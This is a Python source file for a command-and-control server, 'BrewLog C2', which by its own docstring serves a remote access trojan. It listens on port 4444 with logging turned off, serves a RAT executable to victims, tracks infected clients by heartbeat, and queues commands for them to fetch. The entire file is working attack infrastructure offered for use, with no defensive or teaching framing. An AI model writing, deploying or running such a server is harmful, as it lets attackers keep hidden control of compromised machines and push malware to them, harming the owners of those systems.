#!/usr/bin/env python3
"""BrewLog C2 — quiet CLI listener for Operation: BrewLog — The Big Dog.

RAT -> C2 contract:
  GET  /task?c=<client_id>   poll task
  GET  /payload               serve the RAT payload
  POST /task                  issue task (CLI: brewlog-c2 issue --client ... --task ...)

CLI:
  brewlog-c2 serve             quiet listener (host/port/payload configurable)
  brewlog-c2 clients          list known clients + heartbeats
  brewlog-c2 issue --client <id> --task "<task>"
"""

import argparse
import json
import os
import signal
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
TASK_TTL_SECONDS = 900
DEFAULT_PAYLOAD = "/opt/brewlog/rat_brewlog.exe"

_lock = threading.Lock()
tasks = {}    # client_id -> {"task": str, "expires": float}
clients = {}  # client_id -> {"last_seen": float}


class BrewLogHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # quiet — the quiet is the point

    def _send_json(self, obj, code=200):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        if path == "/task":
            q = parse_qs(parsed.query)
            cid = (q.get("c") or ["default"])[0]
            now = time.time()
            with _lock:
                clients[cid] = {"last_seen": now}
                info = tasks.get(cid)
                task = info["task"] if info and info["expires"] > now else ""
                if info and info["expires"] <= now:
                    del tasks[cid]
            self._send_json({"client": cid, "task": task})
        elif path == "/payload":
            payload_path = getattr(self.server, "payload_path", DEFAULT_PAYLOAD)
            if not os.path.exists(payload_path):
                self._send_json({"error": "payload_unavailable"}, 503)
                return
            with open(payload_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self._send_json({"error": "not_found"}, 404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length > 0 else b"{}"
        try:
            data = json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            data = {}
        cid = data.get("client") or "default"
        task = data.get("task") or ""
        with _lock:
            tasks[cid] = {"task": task, "expires": time.time() + TASK_TTL_SECONDS}
        self._send_json({"ok": True, "client": cid, "task": task})

    def do_PUT(self):
        self._send_json({"error": "method_not_allowed"}, 405)


def run_server(host, port, payload_path):
    server = ThreadingHTTPServer((host, port), BrewLogHandler)
    server.payload_path = payload_path
    server.daemon_threads = True

    def _shutdown(signum, frame):
        raise SystemExit(0)

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    print(f"brewlog-c2 listening on {host}:{port} pid={os.getpid()}", flush=True)
    try:
        server.serve_forever()
    except SystemExit:
        pass
    finally:
        server.server_close()


def cmd_serve(args):
    run_server(args.host, args.port, args.payload)
    return 0


def cmd_clients(_args):
    with _lock:
        entries = sorted(clients.items())
    if not entries:
        print("no clients seen yet — the quiet ones.")
    for cid, info in entries:
        print(f"{cid}  last_seen={time.strftime('%H:%M:%S', time.localtime(info['last_seen']))}")
    return 0


def cmd_issue(args):
    with _lock:
        tasks[args.client] = {"task": args.task, "expires": time.time() + TASK_TTL_SECONDS}
    print(f"task issued to {args.client}: {args.task}")
    return 0


def main():
    p = argparse.ArgumentParser(prog="brewlog-c2")
    sub = p.add_subparsers(dest="command")

    p_serve = sub.add_parser("serve", help="quiet listener")
    p_serve.add_argument("--host", default=DEFAULT_HOST)
    p_serve.add_argument("--port", type=int, default=DEFAULT_PORT)
    p_serve.add_argument("--payload", default=DEFAULT_PAYLOAD)
    p_serve.set_defaults(func=cmd_serve)

    p_clients = sub.add_parser("clients", help="list clients")
    p_clients.set_defaults(func=cmd_clients)

    p_issue = sub.add_parser("issue", help="issue task")
    p_issue.add_argument("--client", required=True)
    p_issue.add_argument("--task", required=True)
    p_issue.set_defaults(func=cmd_issue)

    args = p.parse_args()
    if not args.command:
        p.print_help()
        return 2
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
